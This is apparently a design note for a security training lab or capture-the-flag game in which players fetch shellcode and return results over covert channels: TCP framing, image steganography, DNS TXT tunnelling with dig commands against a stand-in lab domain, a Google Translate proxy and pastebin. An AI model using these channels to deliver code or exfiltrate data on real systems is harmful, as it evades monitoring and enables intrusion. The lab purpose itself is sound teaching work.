# Lab

## Game
user透過各種channel取得shellcode, 執行後想辦法將result回傳給server啟動flag

## Channels
### TCP
> <length><16 byte id><action(\x01)>\x00
< <length><16 byte id><shellcode>\x00
> <length><16 byte id><action(\x02)><result>\x00

### HTTP Image Channel
> GET / HTTP/1.1
UA: <id>
< HTTP/1.1 200 OK <img with shellcode in first channel>
> GET /flag.php?result=<result>
UA: <id>

### DNS
> dig <id>.shellcode.lab.example.com TXT
< <id>.shellcode.lab.example.com. 60 IN TXT "<shellcode>"
> dig result[0-7].<id>.shellcode.lab.example.com
> dig result[8-15].<id>.shellcode.lab.example.com
> dig result[16-23].<id>.shellcode.lab.example.com
...
> dig <termination>.<id>.shellcode.lab.example.com

### google translate
>GET translate.google.com?u=evil site
UA: <id>
< page with shellcode in translated text
>GET translate.google.com?u=result site
UA: <id> | <result>

### pastebin
GET file with shellcode
POST file with result
